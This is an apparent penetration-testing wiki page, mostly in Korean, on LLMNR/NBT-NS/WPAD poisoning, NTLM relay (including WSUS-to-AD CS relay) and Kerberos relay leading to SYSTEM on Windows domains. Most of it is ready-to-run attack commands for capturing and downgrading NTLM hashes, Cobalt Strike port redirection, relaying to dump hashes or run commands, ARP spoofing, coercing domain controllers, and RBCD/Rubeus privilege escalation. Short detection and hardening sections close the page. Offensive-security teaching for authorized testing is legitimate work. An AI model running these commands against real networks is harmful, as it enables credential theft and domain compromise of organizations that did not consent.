# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## 네트워크 프로토콜

### 로컬 호스트 이름 해석 프로토콜

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft 및 기타 운영체제는 DNS가 실패할 때 로컬 이름 해석을 위해 LLMNR 및 NBT-NS를 사용합니다. 유사하게, Apple 및 Linux 시스템은 mDNS를 사용합니다.
- 이 프로토콜들은 인증되지 않은 브로드캐스트 방식의 UDP 통신이기 때문에 가로채기 및 spoofing에 취약합니다.
- [Responder](https://github.com/lgandx/Responder) 및 [Dementor](https://github.com/MatrixEditor/Dementor)를 사용해 해당 프로토콜을 질의하는 호스트에 위조 응답을 보내 서비스 사칭이 가능합니다.
- Responder를 이용한 서비스 사칭에 대한 추가 정보는 [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)에서 확인할 수 있습니다.

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD는 브라우저가 프록시 설정을 자동으로 발견할 수 있게 합니다.
- 발견은 DHCP, DNS를 통해 이루어지며 DNS가 실패하면 LLMNR 및 NBT-NS로 폴백됩니다.
- Responder는 WPAD 공격을 자동화하여 클라이언트를 악성 WPAD 서버로 유도할 수 있습니다.

### Responder/Dementor를 이용한 프로토콜 포이즈닝

- **Responder**는 LLMNR, NBT-NS, mDNS 질의를 포이즈닝하는 도구로, 질의 타입에 따라 선택적으로 응답하며 주로 SMB 서비스를 표적으로 합니다.
- Kali Linux에 기본 설치되어 있으며, `/etc/responder/Responder.conf`에서 설정 가능합니다.
- Responder는 캡처한 해시를 화면에 표시하고 `/usr/share/responder/logs` 디렉터리에 저장합니다.
- IPv4 및 IPv6를 모두 지원합니다.
- Windows 버전의 Responder는 [here](https://github.com/lgandx/Responder-Windows)에서 사용할 수 있습니다.

- **Dementor**는 멀티캐스트 포이즈닝 기능을 확장하고, 악성 서비스 제공자(예: CUPS RCE 지원) 역할도 수행합니다.
- 전체 구조는 **Responder**와 유사하지만 더 세분화된 설정을 제공합니다. (기본 설정은 여기: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- **Dementor**와 **Responder** 간호환성은 다음에서 확인할 수 있습니다: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- 소개 및 문서는 여기: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Responder가 특정 프로토콜에서 발생시키는 캡처 문제를 수정합니다.

#### Responder 실행

- 기본 설정으로 Responder 실행: `responder -I <Interface>`
- 더 공격적으로 탐지(부작용 가능): `responder -I <Interface> -P -r -v`
- NTLMv1 challenge/response를 캡처해 크래킹을 쉽게 하는 기법: `responder -I <Interface> --lm --disable-ess`
- WPAD 사칭 활성화: `responder -I <Interface> --wpad`
- NetBIOS 요청을 공격자 IP로 해석하고 인증 프록시를 설정: `responder.py -I <interface> -Pv`

#### Dementor 실행

- 기본 설정으로 실행: `Dementor -I <interface>`
- 분석 모드의 기본 설정: `Dementor -I <interface> -A`
- 자동 NTLM 세션 다운그레이드 (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- 사용자 정의 설정으로 현재 세션 실행: `Dementor -I <interface> --config <file.toml>`

### Responder를 이용한 DHCP 포이즈닝

- DHCP 응답을 스푸핑하면 피해자의 라우팅 정보를 영구적으로 오염시켜 ARP 포이즈닝보다 은밀한 방법을 제공합니다.
- 대상 네트워크 구성에 대한 정확한 지식이 필요합니다.
- 공격 실행: `./Responder.py -I eth0 -Pdv`
- 이 방법은 NTLMv1/2 해시를 효과적으로 캡처할 수 있지만, 네트워크 중단을 피하기 위해 신중하게 다뤄야 합니다.

### Responder/Dementor로 자격증명 수집

- Responder/Dementor는 위에서 언급한 프로토콜을 사용해 서비스를 사칭하며, 사용자가 사칭된 서비스에 인증을 시도할 때 보통 NTLMv2 Challenge/Response 형태의 자격증명을 캡처합니다.
- NetNTLMv1로 다운그레이드하거나 ESS를 비활성화해 자격증명 크래킹을 용이하게 시도할 수 있습니다.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

이러한 기술을 사용하는 경우에는 반드시 적법하고 윤리적으로, 적절한 권한을 얻은 상태에서 수행해야 하며 네트워크 중단이나 무단 접근을 피해야 합니다.

## Inveigh

Inveigh는 Windows 시스템을 위한 penetration testers 및 red teamers용 도구로, Responder와 유사한 기능을 제공하며 spoofing 및 man-in-the-middle attacks를 수행합니다. 이 도구는 PowerShell 스크립트에서 C# 바이너리로 발전했으며, 주요 버전으로는 [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) 및 [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)가 있습니다. 자세한 매개변수와 지침은 [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)에서 확인할 수 있습니다.

Inveigh can be operated through PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
또는 C# 바이너리로 실행:
```bash
Inveigh.exe
```
### NTLM Relay Attack

이 공격은 SMB 인증 세션을 이용해 대상 머신에 접근하며, 성공하면 시스템 셸을 획득합니다. 핵심 전제 조건은 다음과 같습니다:

- 인증하는 사용자는 리레이된 호스트에서 Local Admin 권한을 가져야 합니다.
- SMB signing이 비활성화되어 있어야 합니다.

#### 445 포트 포워딩 및 터널링

직접 네트워크 연결이 불가능한 경우, 포트 445의 트래픽을 포워딩하고 터널링해야 합니다. 예를 들어 [**PortBender**](https://github.com/praetorian-inc/PortBender) 같은 도구는 포트 445 트래픽을 다른 포트로 리다이렉트하는 데 도움을 주며, 이는 Local Admin 접근 권한으로 드라이버 로드가 가능한 경우에 필수적입니다.

PortBender 설정 및 Cobalt Strike에서의 작동:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM Relay Attack를 위한 기타 도구

- **Metasploit**: proxies와 로컬 및 원격 호스트 정보를 설정하여 구성.
- **smbrelayx**: SMB 세션을 중계하고 명령을 실행하거나 backdoors를 배포하기 위한 Python 스크립트.
- **MultiRelay**: Responder 스위트의 도구로 특정 사용자 또는 모든 사용자를 relay하고, 명령을 실행하거나 hashes를 dump할 수 있다.

각 도구는 필요 시 SOCKS proxy를 통해 동작하도록 구성할 수 있어, 간접적인 네트워크 접근만으로도 공격을 수행할 수 있다.

### MultiRelay 동작

MultiRelay는 _**/usr/share/responder/tools**_ 디렉터리에서 실행되며, 특정 IP나 사용자를 대상으로 한다.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
이 도구들과 기법들은 다양한 네트워크 환경에서 NTLM Relay attacks를 수행하기 위한 종합적인 세트를 제공합니다.

### WSUS HTTP (8530) 악용 — NTLM Relay를 이용한 LDAP/SMB/AD CS (ESC8)

WSUS 클라이언트는 NTLM을 사용해 HTTP(8530) 또는 HTTPS(8531)로 업데이트 서버에 인증합니다. HTTP가 활성화되어 있을 경우, 주기적인 클라이언트 체크인이 로컬 세그먼트에서 강제되거나 가로채져 ntlmrelayx로 LDAP/LDAPS/SMB 또는 AD CS HTTP 엔드포인트(ESC8)로 해시 크래킹 없이 릴레이될 수 있습니다. 이는 정상적인 업데이트 트래픽에 섞여 들어가며 종종 머신 계정 인증(HOST$)을 획득합니다.

What to look for
- GPO/registry 설정 위치: HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate 및 ...\WindowsUpdate\AU:
- WUServer (예: http://wsus.domain.local:8530)
- WUStatusServer (보고 URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled 및 DetectionFrequency (시간 단위)
- 클라이언트가 HTTP로 사용하는 WSUS SOAP 엔드포인트:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- 기본 포트: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Unauthenticated
  - 리스너 스캔: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
  - L2 MITM로 HTTP WSUS 트래픽을 스니핑하고 wsusniff.py로 활성 클라이언트/엔드포인트를 기록(클라이언트가 TLS 인증서를 신뢰하게 만들 수 없는 한 HTTP 전용).
- Authenticated
  - SYSVOL GPO에서 WSUS 키를 MANSPIDER + regpol로 파싱 (wsuspider.sh 래퍼는 WUServer/WUStatusServer/UseWUServer 요약 제공).
  - 호스트(또는 로컬)에서 엔드포인트를 대규모로 질의:
    nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
    reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) 클라이언트가 WSUS 서버를 귀하(공격자)로 해석하도록 MITM 위치 확보(같은 L2) — ARP/DNS poisoning, Bettercap, mitm6 등. arpspoof 예시:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) 포트 8530을 리레이 리스너로 리다이렉트(선택적, 편리):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) HTTP 리스너로 ntlmrelayx 시작(HTTP 리스너는 Impacket 지원 필요; 아래 PR 참고):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) 클라이언트 체크인을 트리거하거나 스케줄을 기다립니다. 클라이언트에서:
wuauclt.exe /detectnow
또는 Windows Update UI에서 (Check for updates)을 사용.

5) 인증된 SOCKS 세션(옵션 -socks)을 사용하거나 직접 릴레이 결과로 후속 침투 활동 수행(LDAP 변경, SMB 작업, 또는 향후 인증을 위한 AD CS 인증서 발급 등).

HTTPS constraint (8531)
- 클라이언트가 귀하의 인증서를 신뢰하지 않는 이상 WSUS HTTPS에 대한 수동 가로채기는 효과가 없습니다. 신뢰된 인증서나 다른 TLS 깨기 방법이 없으면 WSUS HTTPS 트래픽에서 NTLM 핸드셰이크를 수집/릴레이할 수 없습니다.

Notes
- WSUS는 deprecated로 발표되었지만 널리 배포되어 있으며 HTTP(8530)는 많은 환경에서 여전히 흔합니다.
- 유용한 도구: wsusniff.py (HTTP WSUS 체크인 관찰), wsuspider.sh (GPO에서 WUServer/WUStatusServer 열거), NetExec reg-query 대규모 실행.
- Impacket은 PR #2034에서 ntlmrelayx용 HTTP 리스너 지원을 복원했습니다(원래는 PR #913에서 추가됨).

### NTLM 로그인 강제

Windows에서 **일부 권한 있는 계정을 임의의 머신으로 인증하도록 강제할 수 있는 경우가 있습니다**. 방법을 보려면 다음 페이지를 읽으세요:

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack**는 한 서비스에서 **AP-REQ ticket**을 탈취해 동일한 **computer-account key**를 공유하는(두 SPN이 같은 `$` 머신 계정에 있기 때문에) 두 번째 서비스에 재사용합니다. SPN의 **service classes가 다르더라도**(예: `CIFS/` → `LDAP/`) 이는 작동하는데, 그 이유는 티켓을 복호화하는 *키*가 SPN 문자열 자체가 아니라 머신의 NT 해시이며 SPN 문자열은 서명에 포함되지 않기 때문입니다.

NTLM relay와 달리 홉은 *같은 호스트*로 제한되지만, LDAP에 쓰기가 가능한 프로토콜을 목표로 하면 **Resource-Based Constrained Delegation (RBCD)**이나 **AD CS enrollment**로 체인하여 한 번에 **NT AUTHORITY\SYSTEM**을 획득할 수 있습니다.

이 공격에 대한 자세한 정보는 다음을 확인하세요:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | KDC에 대해 사용자를 증명 | 변경 없음 |
| **Service ticket / TGS-REQ ↔ REP** | 하나의 **SPN**에 바인딩; SPN 소유자의 키로 암호화됨 | SPN이 계정을 공유하면 교환 가능 |
| **AP-REQ** | 클라이언트가 `TGS`를 서비스에 전송 | **우리가 탈취해서 재전송하는 것** |

* 티켓은 **SPN을 소유한 계정의 비밀번호에서 파생된 키**로 암호화됩니다.
* AP-REQ 내부의 **Authenticator**는 5분 타임스탬프를 가지며; 그 창 내에서 재전송은 서비스 캐시가 중복을 인식하기 전까지 유효합니다.
* Windows는 티켓 내의 SPN 문자열이 당신이 접근한 서비스와 일치하는지 거의 확인하지 않으므로, `CIFS/HOST`용 티켓은 보통 `LDAP/HOST`에서 정상적으로 복호화됩니다.

- 2. **Kerberos를 릴레이하려면 충족되어야 할 조건**

1. **Shared key:** 출발지와 목표 SPN이 동일한 컴퓨터 계정에 속해야 함(Windows 서버의 기본 설정).
2. **No channel protection:** SMB/LDAP 서명 비활성화 및 HTTP/LDAPS에 대한 EPA 비활성화.
3. **인증을 가로채거나 강제할 수 있어야 함:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM 등.
4. **티켓 출처가 이미 사용되지 않았을 것:** 실제 패킷이 도달하기 전에 레이스에서 이겨야 하며 그렇지 않으면 서버의 재생 캐시가 Event 4649를 발생시킵니다.
5. 통신에서 **MitM을 수행할 수 있어야** 합니다 — 예를 들어 도메인의 DNS를 수정할 수 있는 DNSAmins 그룹의 일부이거나 피해자의 HOST 파일을 변경할 수 있어야 합니다.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **릴레이 리스너 시작하기**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp`는 **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass**를 하나의 바이너리로 묶습니다.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce는 DC가 Kerberos `CIFS/DC01` 티켓을 우리에게 전송하도록 만듭니다.

- 3.4 **Relay the AP-REQ**

KrbRelay는 SMB에서 GSS blob을 추출하고, 이를 LDAP bind에 재포장한 다음 `ldap://DC01`로 전달합니다—인증은 **같은 키**가 이를 복호화하기 때문에 성공합니다.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
이제 **NT AUTHORITY\SYSTEM** 권한을 획득했습니다.


### **알아두면 좋은 추가 경로**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | 악성 서버가 임의의 SPN으로 **GSS-ID payload**를 전송; 클라이언트가 바로 당신에게 AP-REQ를 생성 | 서브넷을 넘어도 동작; 기본적으로 machine creds 사용 |
| **DCOM / MSRPC** | 악성 OXID resolver가 클라이언트가 임의의 SPN과 포트로 인증하게 강제 | 순수한 *local* priv-esc; 방화벽 우회 |
| **AD CS Web Enroll** | 머신 티켓을 `HTTP/CA`에 릴레이해 인증서 획득, 이후 **PKINIT**으로 TGT 발급 | LDAP 서명 방어 우회 |
| **Shadow Credentials** | `msDS-KeyCredentialLink` 쓰기, 이후 위조 키 페어로 PKINIT | 컴퓨터 계정 추가 불필요 |

### **문제 해결**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | 티켓 키 ≠ 대상 키 | 잘못된 호스트/SPN |
| `KRB_AP_ERR_SKEW` | 시계가 5분 이상 차이 | 시간 동기화 또는 `w32tm` 사용 |
| LDAP bind fails | 서명 강제 | AD CS 경로 사용 또는 서명 비활성화 |
| Event 4649 spam | 서비스가 중복된 Authenticator 감지 | 원본 패킷 차단 또는 레이스(경쟁) |

### **감지**

* 몇 초 내에 동일 출처에서 `CIFS/`, `HTTP/`, `LDAP/`에 대한 **Event 4769** 급증.
* 서비스에서의 **Event 4649**는 재전송(replay) 감지 신호.
* **127.0.0.1**로부터의 Kerberos 로그온(로컬 SCM으로의 relay)은 매우 의심스러움 — KrbRelayUp 문서의 Sigma 룰로 매핑하세요.
* `msDS-AllowedToActOnBehalfOfOtherIdentity` 또는 `msDS-KeyCredentialLink` 속성 변경을 감시하세요.

## **하드닝**

1. 모든 서버에서 **Enforce LDAP & SMB signing + EPA** 적용.
2. **Split SPNs**로 HTTP가 CIFS/LDAP와 동일 계정에 있지 않도록 분리.
3. coercion 벡터 패치 적용(예: PetitPotam KB5005413, DFS, AuthIP).
4. 무단 컴퓨터 가입을 막기 위해 **`ms-DS-MachineAccountQuota = 0`** 설정.
5. **Event 4649** 및 예상치 못한 루프백 Kerberos 로그온에 대해 경보 설정.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
